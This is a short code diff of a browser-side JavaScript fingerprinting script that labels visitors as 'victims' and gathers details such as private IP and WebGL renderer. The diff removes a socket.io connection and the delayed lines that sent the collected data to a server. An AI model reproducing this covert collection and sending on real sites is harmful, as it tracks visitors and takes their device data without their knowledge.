@@ -5,9 +5,6 @@ TODO:
 - LETS SEE HOW MANY WEB APIS WE CAN MESS WITH
 
 */
-var socket = io.connect({
-  secure: true
-});
 
 var victimid = Math.random().toString(36).substring(2);
 var privip;
@@ -510,13 +507,4 @@ function getIPs(callback) {
       final.webglrenderer = gl.getParameter(gl.RENDERER)
     }
   }
-
-
-
 }());
-
-if (final.userAgent.match(/linux/ig)) {
-    setTimeout(()=>{ socket.emit('sending-info', final) }, 5*1000)
-  } else {
-    setTimeout(()=>{ socket.emit('sending-info', final) }, 20*1000)
-  }
